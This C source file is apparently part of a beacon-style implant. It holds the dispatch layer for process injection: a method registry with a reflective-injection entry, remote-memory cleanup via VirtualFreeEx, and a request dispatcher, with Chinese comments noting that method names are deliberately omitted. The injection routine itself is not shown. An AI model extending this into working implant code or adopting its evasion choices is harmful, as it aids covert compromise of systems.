#include "beacon_inject.h"
#include "inject_internal.h"

typedef struct InjectMethodEntry {
    UINT32 id;
    InjectMethodHandler handler;
} InjectMethodEntry;

/* 注入方法注册表：只保存数值 ID 和函数指针，不携带可读名称。 */
static const InjectMethodEntry g_inject_methods[] = {
    { INJECT_METHOD_REFLECTIVE, InjectPrepareReflective }
};

/* 初始化注入结果，便于调用方在失败路径统一清理。 */
VOID InjectResultInit(InjectResult* result)
{
    if (!result) return;
    ZeroMemory(result, sizeof(*result));
}

/* 释放本次注入准备阶段分配的远程内存。 */
VOID InjectFreeRemote(HANDLE process, InjectResult* result)
{
    if (!process || !result) return;

    if (result->remote_parameter) {
        VirtualFreeEx(process, result->remote_parameter, 0, MEM_RELEASE);
        result->remote_parameter = NULL;
        result->remote_parameter_size = 0;
    }
    if (result->remote_image) {
        VirtualFreeEx(process, result->remote_image, 0, MEM_RELEASE);
        result->remote_image = NULL;
        result->remote_image_size = 0;
    }
    result->remote_entry = NULL;
}

/* 按 method id 查找注入实现，避免 switch 随方法数增长。 */
static const InjectMethodEntry* InjectMethodFind(UINT32 method)
{
    SIZE_T i;
    for (i = 0; i < sizeof(g_inject_methods) / sizeof(g_inject_methods[0]); i++) {
        if (g_inject_methods[i].id == method) return &g_inject_methods[i];
    }
    return NULL;
}

/* 注入准备总入口：校验请求并分发到具体 method handler。 */
BOOL InjectPrepare(const InjectRequest* req,
                   InjectResult* result,
                   CHAR* err,
                   SIZE_T err_size)
{
    const InjectMethodEntry* entry;

    if (result) InjectResultInit(result);
    if (err && err_size) err[0] = '\0';

    if (!req) {
        if (err) strcpy_s(err, err_size, "invalid inject request");
        return FALSE;
    }

    entry = InjectMethodFind(req->method);
    if (!entry) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "inject method %lu not registered",
                             (unsigned long)req->method);
        return FALSE;
    }

    return entry->handler(req, result, err, err_size);
}
